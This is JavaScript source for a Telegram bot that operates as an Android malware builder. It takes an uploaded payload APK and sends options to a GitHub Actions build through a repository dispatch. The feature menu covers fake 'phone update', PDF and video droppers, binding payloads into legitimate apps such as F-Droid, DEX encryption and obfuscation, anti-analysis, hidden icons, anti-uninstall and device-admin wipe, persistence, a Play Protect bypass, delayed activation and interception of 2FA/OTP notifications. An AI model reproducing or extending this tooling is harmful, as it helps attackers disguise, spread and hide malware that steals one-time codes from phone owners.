import { Bot, InlineKeyboard } from "grammy";
import axios from "axios";

const BOT_TOKEN    = process.env.TELEGRAM_BOT_TOKEN;
const GITHUB_TOKEN = process.env.GITHUB_TOKEN;
const GITHUB_OWNER = process.env.GITHUB_OWNER;
const GITHUB_REPO  = process.env.GITHUB_REPO;
const ADMIN_IDS    = (process.env.ADMIN_IDS || "").split(",").map(Number).filter(Boolean);

if (!BOT_TOKEN || !GITHUB_TOKEN || !GITHUB_OWNER || !GITHUB_REPO) {
  console.error("Missing required env vars");
  process.exit(1);
}

const bot = new Bot(BOT_TOKEN);

// ─── Session Store ─────────────────────────────────────────────────────
const S = new Map();

function sess(uid) {
  if (!S.has(uid)) S.set(uid, {
    step: "idle",
    fileId: null, fileName: null, fileSize: 0,
    features: [],
    rename: "",
    iconFileId: "", iconFileName: "",
    delayMin: 0,
    wifiOnly: false,
    selfDelete: true,
    killAfter: true,
    fakeError: false,
    notifListener: false,
    clonePkg: "",
    binderUrl: "",
    binderFileId: "",
  });
  return S.get(uid);
}

const isAdmin = id => ADMIN_IDS.length === 0 || ADMIN_IDS.includes(id);

// ─── Feature Definitions ───────────────────────────────────────────────
const FEAT = {
  dropper:       { l:"📱 Phone Update Dropper",       c:"Droppers",     d:"3-page WebView: scan→available→install" },
  force_lock:    { l:"🔒 Force Install Lock",         c:"Lockdown",     d:"Overlay + back-button override" },
  binder:        { l:"🎭 APK Binder",                 c:"Binder",       d:"Merge payload into legit host APK" },
  dex_encrypt:   { l:"🔐 DEX Encryption",             c:"Evasion",      d:"AES-256 encrypt classes.dex" },
  stealth:       { l:"👻 Stealth Mode",               c:"Stealth",      d:"No icon, PM hide, foreground service" },
  anti_uninstall:{ l:"🔧 Anti-Uninstall",             c:"Persistence",  d:"Accessibility guard + device admin" },
  device_admin:  { l:"🛡️ Device Admin",               c:"Persistence",  d:"Request admin, force-lock, wipe" },
  anti_analysis: { l:"🧪 Anti-Analysis",              c:"Evasion",      d:"Emulator/debugger/root/VM detection" },
  rename:        { l:"✏️ APK Rename",                 c:"Config",       d:"Custom output filename" },
  icon_changer:  { l:"🎨 Launcher Changer",           c:"Config",       d:"Custom icon + app name + package" },
  payload_obf:   { l:"⚡ Payload Obfuscation",        c:"Evasion",      d:"DEX recompile, string encrypt, strip debug" },
  self_delete:   { l:"🗑️ Self-Delete",               c:"Stealth",      d:"Delete APK after install" },
  time_bomb:     { l:"⏰ Time Bomb",                  c:"Evasion",      d:"Delayed activation (minutes/hours)" },
  fake_error:    { l:"❌ Fake Error",                  c:"Droppers",     d:"Show 'Update failed' after payload" },
  notif_listener:{ l:"🔔 Notification Listener",      c:"Spy",          d:"Intercept 2FA/OTP notifications" },
  wifi_only:     { l:"🌐 WiFi-Only Activation",       c:"Evasion",      d:"Only trigger on WiFi" },
  kill_after:    { l:"💀 Kill After Install",         c:"Stealth",      d:"Auto-close dropper after trigger" },
  persistence:   { l:"🔄 Persistence",                c:"Persistence",  d:"JobScheduler + AlarmManager + Boot" },
  pdf_dropper:   { l:"📄 PDF Dropper",                c:"Droppers",     d:"Decoy PDF viewer with payload" },
  mp4_embed:     { l:"🎬 MP4 Embedding",              c:"Droppers",     d:"Video player decoy" },
  play_bypass:   { l:"🛡️ Play Protect Bypass",        c:"Evasion",      d:"Install via session API (8-13)" },
  clone_icon:    { l:"📱 Clone Icon",                 c:"Stealth",      d:"Dynamically change to calc/settings" },
};

const CATS = ["Droppers","Lockdown","Stealth","Persistence","Evasion","Binder","Spy","Config"];
const CAT_EMOJI = { Droppers:"📱", Lockdown:"🔒", Stealth:"👻", Persistence:"🔄", Evasion:"🛡️", Binder:"🎭", Spy:"👁️", Config:"⚙️" };

function featKb(s) {
  const kb = new InlineKeyboard();
  for (const cat of CATS) {
    const items = Object.entries(FEAT).filter(([,f]) => f.c === cat);
    if (!items.length) continue;
    kb.text(`${CAT_EMOJI[cat]} ${cat}`, `_hdr_${cat}`).row();
    for (const [k, f] of items) {
      kb.text(f.l + (s.features.includes(k) ? " ✅" : ""), `feat_${k}`);
    }
    kb.row();
  }
  kb.text("⚙️ CONFIGURE", "cfg").row();
  kb.text("🚀 BUILD APK", "build").text("🗑️ RESET", "reset");
  return kb;
}

// ─── BOT COMMANDS ──────────────────────────────────────────────────────

bot.command("start", async ctx => {
  if (!isAdmin(ctx.from.id)) return ctx.reply("⛔ Unauthorized");
  S.delete(ctx.from.id);
  await ctx.reply(
    "*🤖 Telegram APK Builder v2*\n\n" +
    "Send an `.apk` file to start.\n" +
    "Select features, configure options, build.\n\n" +
    "*/help* — commands\n*/features* — current selection\n*/build* — quick build",
    { parse_mode:"Markdown" }
  );
});

bot.command("help", async ctx => {
  if (!isAdmin(ctx.from.id)) return;
  await ctx.reply(
    "*1.* Upload `.apk`\n*2.* Select features from buttons\n*3.* Tap ⚙️ CONFIGURE\n*4.* Tap 🚀 BUILD APK\n*5.* Wait ~2-5 min\n*6.* Download back\n\nAll 22 features available.",
    { parse_mode:"Markdown" }
  );
});

bot.command("features", async ctx => {
  const uid = ctx.from.id;
  if (!isAdmin(uid)) return;
  const s = sess(uid);
  const txt = s.features.length === 0
    ? "*📋 No features selected*"
    : "*📋 Selected:*\n"+s.features.map(f=>`• ${FEAT[f]?.l||f}`).join("\n");
  await ctx.reply(txt, { parse_mode:"Markdown", reply_markup:featKb(s) });
});

// ─── APK UPLOAD ────────────────────────────────────────────────────────

bot.on("message:document", async ctx => {
  const uid = ctx.from.id;
  if (!isAdmin(uid)) return;
  const doc = ctx.message.document;
  const s = sess(uid);

  // Icon upload mode
  if (s.step === "await_icon") {
    s.iconFileId = doc.file_id;
    s.iconFileName = doc.file_name;
    s.step = "uploaded";
    await ctx.reply(`✅ Icon: \`${doc.file_name}\``, { parse_mode:"Markdown", reply_markup:featKb(s) });
    return;
  }

  // Binder host upload mode
  if (s.step === "await_binder") {
    s.binderFileId = doc.file_id;
    s.step = "uploaded";
    await ctx.reply(`✅ Host APK: \`${doc.file_name}\``, { parse_mode:"Markdown", reply_markup:featKb(s) });
    return;
  }

  // Normal payload
  if (!doc.file_name?.endsWith(".apk")) return ctx.reply("❌ Send an `.apk` file.");

  s.step = "uploaded";
  s.fileId = doc.file_id;
  s.fileName = doc.file_name;
  s.fileSize = doc.file_size;
  await ctx.reply(
    `✅ *Received:* \`${doc.file_name}\` (${(doc.file_size/1024/1024).toFixed(1)} MB)\n\nSelect features → 🚀 BUILD`,
    { parse_mode:"Markdown", reply_markup:featKb(s) }
  );
});

// ─── CALLBACKS ─────────────────────────────────────────────────────────

bot.callbackQuery(/^feat_(.+)/, async ctx => {
  const uid = ctx.from.id;
  if (!isAdmin(uid)) return ctx.answerCallbackQuery("⛔");
  const k = ctx.match[1];
  const s = sess(uid);
  const i = s.features.indexOf(k);
  i > -1 ? s.features.splice(i,1) : s.features.push(k);
  await ctx.editMessageReplyMarkup({ reply_markup:featKb(s) });
  await ctx.answerCallbackQuery(s.features.includes(k) ? `✅ ${FEAT[k]?.l||k}` : `❌ removed`);
});

bot.callbackQuery(/^_hdr_/, async ctx => ctx.answerCallbackQuery());

// ─── CONFIGURE PANEL ──────────────────────────────────────────────────

bot.callbackQuery("cfg", async ctx => {
  const uid = ctx.from.id;
  if (!isAdmin(uid)) return ctx.answerCallbackQuery("⛔");
  const s = sess(uid);
  const kb = new InlineKeyboard()
    .text(`✏️ Rename: ${s.rename||"(default)"}`, "cfg_rename").row()
    .text(`🎨 Icon: ${s.iconFileId?"✅":"❌"}`, "cfg_icon").row()
    .text(`⏰ Delay: ${s.delayMin>0?s.delayMin+"min":"none"}`, "cfg_delay").row()
    .text(`🌐 WiFi: ${s.wifiOnly?"✅":"❌"}`, "cfg_wifi").row()
    .text(`🗑️ SelfDel: ${s.selfDelete?"✅":"❌"}`, "cfg_selfdel").row()
    .text(`💀 Kill: ${s.killAfter?"✅":"❌"}`, "cfg_kill").row()
    .text(`❌ FakeErr: ${s.fakeError?"✅":"❌"}`, "cfg_fakeerr").row()
    .text(`📱 Clone: ${s.clonePkg||"(empty)"}`, "cfg_clone").row()
    .text(`🎭 Binder: ${s.binderFileId||s.binderUrl?"✅":"❌"}`, "cfg_binder").row()
    .text("🔙 BACK", "back");
  await ctx.editMessageText(
    "*⚙️ Configuration*\nTap to toggle or set.",
    { parse_mode:"Markdown", reply_markup:kb }
  );
  await ctx.answerCallbackQuery();
});

const CFG_ACTIONS = {
  cfg_rename: async (ctx, s) => { s.step="await_rename"; await ctx.editMessageText("✏️ Send new filename (without .apk):"); await ctx.answerCallbackQuery(); },
  cfg_icon: async (ctx, s) => {
    if (s.iconFileId) { s.iconFileId=""; s.iconFileName=""; await ctx.editMessageReplyMarkup({reply_markup:featKb(s)}); await ctx.answerCallbackQuery("❌ Icon removed"); }
    else { s.step="await_icon"; await ctx.editMessageText("🎨 Send a PNG for launcher icon:"); await ctx.answerCallbackQuery(); }
  },
  cfg_delay: async (ctx, s) => { s.step="await_delay"; await ctx.editMessageText("⏰ Delay in minutes (0-10080):"); await ctx.answerCallbackQuery(); },
  cfg_wifi: async (ctx, s) => { s.wifiOnly=!s.wifiOnly; await ctx.editMessageReplyMarkup({reply_markup:featKb(s)}); await ctx.answerCallbackQuery(s.wifiOnly?"✅ WiFi ON":"❌ WiFi OFF"); },
  cfg_selfdel: async (ctx, s) => { s.selfDelete=!s.selfDelete; await ctx.editMessageReplyMarkup({reply_markup:featKb(s)}); await ctx.answerCallbackQuery(s.selfDelete?"✅ SelfDel ON":"❌ SelfDel OFF"); },
  cfg_kill: async (ctx, s) => { s.killAfter=!s.killAfter; await ctx.editMessageReplyMarkup({reply_markup:featKb(s)}); await ctx.answerCallbackQuery(s.killAfter?"✅ Kill ON":"❌ Kill OFF"); },
  cfg_fakeerr: async (ctx, s) => { s.fakeError=!s.fakeError; await ctx.editMessageReplyMarkup({reply_markup:featKb(s)}); await ctx.answerCallbackQuery(s.fakeError?"✅ FakeErr ON":"❌ FakeErr OFF"); },
  cfg_clone: async (ctx, s) => { s.step="await_clone"; await ctx.editMessageText("📱 Package to clone (com.example.app):"); await ctx.answerCallbackQuery(); },
  cfg_binder: async (ctx, s) => {
    if (s.binderFileId) { s.binderFileId=""; s.binderUrl=""; await ctx.editMessageReplyMarkup({reply_markup:featKb(s)}); await ctx.answerCallbackQuery("❌ Binder removed"); }
    else { s.step="await_binder"; await ctx.editMessageText("🎭 Send a legit APK to use as binder host:"); await ctx.answerCallbackQuery(); }
  },
};

bot.callbackQuery(/^cfg_/, async ctx => {
  const uid = ctx.from.id;
  if (!isAdmin(uid)) return ctx.answerCallbackQuery("⛔");
  const s = sess(uid);
  const k = ctx.match[0];
  await CFG_ACTIONS[k](ctx, s);
});

bot.callbackQuery("back", async ctx => {
  const uid = ctx.from.id;
  if (!isAdmin(uid)) return ctx.answerCallbackQuery("⛔");
  const s = sess(uid);
  const info = s.fileName ? `📱 \`${s.fileName}\`` : "❌ No APK";
  await ctx.editMessageText(
    `*🤖 APK Builder*\n\nPayload: ${info}\nFeatures: ${s.features.length}\n\nSelect → 🚀 BUILD`,
    { parse_mode:"Markdown", reply_markup:featKb(s) }
  );
  await ctx.answerCallbackQuery();
});

bot.callbackQuery("reset", async ctx => {
  const uid = ctx.from.id;
  if (!isAdmin(uid)) return ctx.answerCallbackQuery("⛔");
  S.delete(uid);
  await ctx.editMessageText("🗑️ Reset. Send a new APK.");
  await ctx.answerCallbackQuery("Reset done");
});

// ─── BUILD ──────────────────────────────────────────────────────────────

bot.callbackQuery("build", async ctx => {
  const uid = ctx.from.id;
  if (!isAdmin(uid)) return ctx.answerCallbackQuery("⛔");
  const s = sess(uid);

  if (!s.fileId) return ctx.answerCallbackQuery("❌ Upload APK first!");
  if (s.features.length === 0) return ctx.answerCallbackQuery("❌ Select features!");

  // Default binder URL if binder selected but no host
  if (s.features.includes("binder") && !s.binderFileId && !s.binderUrl) {
    s.binderUrl = "https://f-droid.org/repo/org.fdroid.fdroid_1010050.apk";
  }

  await ctx.editMessageText("🚀 *Building...*\n⏱ ETA 2-5 min\nYou'll get the APK here.", { parse_mode:"Markdown" });
  await ctx.answerCallbackQuery("Build dispatched");

  try {
    const payload = {
      event_type: "build_apk",
      client_payload: {
        file_id: s.fileId,
        file_name: s.fileName,
        chat_id: ctx.chat.id,
        reply_to: ctx.msg?.message_id || ctx.callbackQuery.message.message_id,
        features: s.features,
        rename: s.rename,
        icon_file_id: s.iconFileId,
        icon_file_name: s.iconFileName,
        delay_min: s.delayMin,
        wifi_only: s.wifiOnly,
        self_delete: s.selfDelete,
        kill_after: s.killAfter,
        fake_error: s.fakeError,
        notif_listener: s.notifListener,
        clone_pkg: s.clonePkg,
        binder_file_id: s.binderFileId,
        binder_url: s.binderUrl,
      },
    };

    const r = await axios.post(
      `https://api.github.com/repos/${GITHUB_OWNER}/${GITHUB_REPO}/dispatches`,
      payload,
      { headers: { Authorization:`Bearer ${GITHUB_TOKEN}`, Accept:"application/vnd.github.v3+json", "User-Agent":"apk-builder" } }
    );
    console.log(`[BUILD] ${uid} → ${r.status}`);
  } catch (e) {
    console.error("[BUILD ERR]", e.message);
    await ctx.reply(`❌ *Build failed:* ${e.message}`, { parse_mode:"Markdown" });
  }
});

// ─── TEXT INPUT ────────────────────────────────────────────────────────

bot.on("message:text", async ctx => {
  const uid = ctx.from.id;
  if (!isAdmin(uid)) return;
  const s = sess(uid);
  const txt = ctx.message.text.trim();

  if (s.step === "await_rename") {
    if (/^[a-zA-Z0-9_-]{1,63}$/.test(txt)) {
      s.rename = txt; s.step="uploaded";
      await ctx.reply(`✅ Output: \`${txt}.apk\``, { parse_mode:"Markdown", reply_markup:featKb(s) });
    } else { await ctx.reply("❌ Use letters, numbers, hyphens (1-63 chars):"); }
    return;
  }

  if (s.step === "await_delay") {
    const n = parseInt(txt,10);
    if (n >= 0 && n <= 10080) {
      s.delayMin = n; s.step="uploaded";
      await ctx.reply(`✅ Delay: ${n} min`, { reply_markup:featKb(s) });
    } else { await ctx.reply("❌ 0-10080:"); }
    return;
  }

  if (s.step === "await_clone") {
    if (/^[a-zA-Z0-9._-]{3,}$/.test(txt)) {
      s.clonePkg = txt; s.step="uploaded";
      await ctx.reply(`✅ Clone: \`${txt}\``, { parse_mode:"Markdown", reply_markup:featKb(s) });
    } else { await ctx.reply("❌ Invalid package name:"); }
    return;
  }

  await ctx.reply("Send an APK to start. /help for commands.");
});

// ─── START ─────────────────────────────────────────────────────────────

bot.start({ onStart: () => console.log("✅ Bot online") });
